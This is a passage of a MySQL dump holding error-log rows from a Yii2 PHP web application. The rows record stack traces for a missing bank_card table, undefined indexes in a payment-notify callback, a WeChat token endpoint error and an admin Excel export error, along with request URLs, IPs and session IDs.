yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\n\nNext exception \'yii\\db\\Exception\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\nThe SQL being executed was: SELECT * FROM `bank_card` `bankCard` WHERE `user_id`=100005\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Schema.php:633\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(915): yii\\db\\Schema->convertException(Object(PDOException), \'SELECT * FROM `...\')\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\nAdditional Information:\nArray\n(\n    [0] => 42S02\n    [1] => 1146\n    [2] => Table \'x50.bank_card\' doesn\'t exist\n)\n');
INSERT INTO `log` VALUES ('17', '1', 'yii\\base\\ErrorException:8', '1495015101.9881', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify][106.36.216.116][-][lfrqfhvd7um5i1l92iebtmlap0]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: opstate\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:672\nStack trace:\n#0 /phpstudy/www/x50/frontend/controllers/SiteController.php(672): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 672, Array)\n#1 [internal function]: frontend\\controllers\\SiteController->actionTynotify()\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#7 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#8 {main}');
INSERT INTO `log` VALUES ('18', '1', 'yii\\base\\ErrorException:8', '1495015157.9788', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify][106.36.216.116][-][lfrqfhvd7um5i1l92iebtmlap0]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: opstate\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:672\nStack trace:\n#0 /phpstudy/www/x50/frontend/controllers/SiteController.php(672): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 672, Array)\n#1 [internal function]: frontend\\controllers\\SiteController->actionTynotify()\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#7 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#8 {main}');
INSERT INTO `log` VALUES ('19', '1', 'yii\\base\\ErrorException:8', '1495015256.4027', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify][106.36.216.116][-][lfrqfhvd7um5i1l92iebtmlap0]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: opstate\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:672\nStack trace:\n#0 /phpstudy/www/x50/frontend/controllers/SiteController.php(672): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 672, Array)\n#1 [internal function]: frontend\\controllers\\SiteController->actionTynotify()\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#7 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#8 {main}');
INSERT INTO `log` VALUES ('20', '1', 'yii\\base\\ErrorException:8', '1495015300.7785', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify][106.36.216.116][-][lfrqfhvd7um5i1l92iebtmlap0]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: opstate\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:672\nStack trace:\n#0 /phpstudy/www/x50/frontend/controllers/SiteController.php(672): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 672, Array)\n#1 [internal function]: frontend\\controllers\\SiteController->actionTynotify()\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#7 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#8 {main}');
INSERT INTO `log` VALUES ('21', '1', 'yii\\base\\ErrorException:8', '1495015301.031', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify][106.36.216.116][-][lfrqfhvd7um5i1l92iebtmlap0]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: opstate\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:672\nStack trace:\n#0 /phpstudy/www/x50/frontend/controllers/SiteController.php(672): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 672, Array)\n#1 [internal function]: frontend\\controllers\\SiteController->actionTynotify()\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#7 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#8 {main}');
INSERT INTO `log` VALUES ('22', '1', 'yii\\base\\ErrorException:8', '1495015480.255', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify][106.36.216.116][-][lfrqfhvd7um5i1l92iebtmlap0]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: opstate\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:672\nStack trace:\n#0 /phpstudy/www/x50/frontend/controllers/SiteController.php(672): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 672, Array)\n#1 [internal function]: frontend\\controllers\\SiteController->actionTynotify()\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#7 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#8 {main}');
INSERT INTO `log` VALUES ('23', '1', 'yii\\db\\Exception', '1495015568.756', '[GET][http://www.semi-autogeneousmillprice.cn/user/bank-card][183.163.4.110][100007][s9a0t68i1h9e76lmqg9dgs3if1]', 'exception \'PDOException\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php:900\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(900): PDOStatement->execute()\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\n\nNext exception \'yii\\db\\Exception\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\nThe SQL being executed was: SELECT * FROM `bank_card` `bankCard` WHERE `user_id`=100007\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Schema.php:633\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(915): yii\\db\\Schema->convertException(Object(PDOException), \'SELECT * FROM `...\')\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\nAdditional Information:\nArray\n(\n    [0] => 42S02\n    [1] => 1146\n    [2] => Table \'x50.bank_card\' doesn\'t exist\n)\n');
INSERT INTO `log` VALUES ('24', '1', 'yii\\base\\ErrorException:8', '1495015996.1725', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171812513336&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+18%3a13%3a15&sysorderid=1705171812518490305&completiontime=2017%2f05%2f17+18%3a13%3a15&attach=&msg=&sign=6d6d4305f8a7bfb595ad68cb1220a8ca][211.149.156.143][-][hejkg4jbquc1d0ovj0ru99anr3]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('25', '1', 'yii\\base\\ErrorException:8', '1495016007.9497', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171812513336&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+18%3a13%3a27&sysorderid=1705171812518490305&completiontime=2017%2f05%2f17+18%3a13%3a27&attach=&msg=&sign=6d6d4305f8a7bfb595ad68cb1220a8ca][211.149.156.143][-][nim8b6845ss7mc21rutm0njlg5]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('26', '1', 'yii\\base\\ErrorException:8', '1495016024.9502', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171812513336&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+18%3a13%3a44&sysorderid=1705171812518490305&completiontime=2017%2f05%2f17+18%3a13%3a44&attach=&msg=&sign=6d6d4305f8a7bfb595ad68cb1220a8ca][211.149.156.143][-][ogrsu4skvas7vbubnckia2gug7]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('27', '1', 'yii\\base\\ErrorException:8', '1495016057.7157', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171812513336&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+18%3a14%3a17&sysorderid=1705171812518490305&completiontime=2017%2f05%2f17+18%3a14%3a17&attach=&msg=&sign=6d6d4305f8a7bfb595ad68cb1220a8ca][211.149.156.143][-][hkj91cdnvod177ojefbktffso2]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('28', '1', 'yii\\base\\ErrorException:8', '1495016239.3353', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171812513336&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+18%3a17%3a19&sysorderid=1705171812518490305&completiontime=2017%2f05%2f17+18%3a17%3a19&attach=&msg=&sign=6d6d4305f8a7bfb595ad68cb1220a8ca][211.149.156.143][-][6hfmlvjq96dacosceqlqpad9b7]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('29', '1', 'yii\\base\\ErrorException:8', '1495016497.0588', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171747036747&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+18%3a21%3a36&sysorderid=1705171747037890889&completiontime=2017%2f05%2f17+18%3a21%3a36&attach=&msg=&sign=803adf6e03cd62ea98f2be3066ce03f4][211.149.156.143][-][9sn7niuvmdtulvoa8pbi3q4ao0]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('30', '1', 'yii\\base\\ErrorException:8', '1495016873.0492', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171753349384&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+18%3a27%3a52&sysorderid=1705171753343190050&completiontime=2017%2f05%2f17+18%3a27%3a52&attach=&msg=&sign=b5573a9a5d14f54eb2533becd2f59b0c][211.149.156.143][-][8u4k02d33p2q5cv6bmvb0boja6]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('31', '1', 'yii\\base\\ErrorException:2', '1495016951.2375', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=cd9a6d46c4852641a0a4c522df4a055e722667ee&timestamp=1495016951&nonce=1151070203&openid=oAkX8wEeiDm83-FZh2b7qTjQpKro][58.247.206.152][-][4gmdvgsrtan8nbpe5dqr6n90i7]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('32', '1', 'yii\\base\\ErrorException:8', '1495018041.9601', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100003201705171812513336&opstate=0&ovalue=0.01&systime=2017%2f05%2f17+18%3a47%3a21&sysorderid=1705171812518490305&completiontime=2017%2f05%2f17+18%3a47%3a21&attach=&msg=&sign=6d6d4305f8a7bfb595ad68cb1220a8ca][211.149.156.143][-][gb651sposgjn89190qlh8okk45]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('33', '1', 'yii\\base\\UnknownPropertyException', '1495018073.85642', '[GET][http://www.semi-autogeneousmillprice.cn/admin/user/user-excel?][60.170.186.143][2][bt570t3bebg35j303ra68bitj1]', 'exception \'yii\\base\\UnknownPropertyException\' with message \'Getting unknown property: admin\\models\\User::user\' in /phpstudy/www/x50/vendor/yiisoft/yii2/base/Component.php:143\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/BaseActiveRecord.php(252): yii\\base\\Component->__get(\'user\')\n#1 /phpstudy/www/x50/frontend/modules/admin/controllers/UserController.php(110): yii\\db\\BaseActiveRecord->__get(\'user\')\n#2 [internal function]: admin\\controllers\\UserController->actionUserExcel()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'user-excel\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'admin/user/user...\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
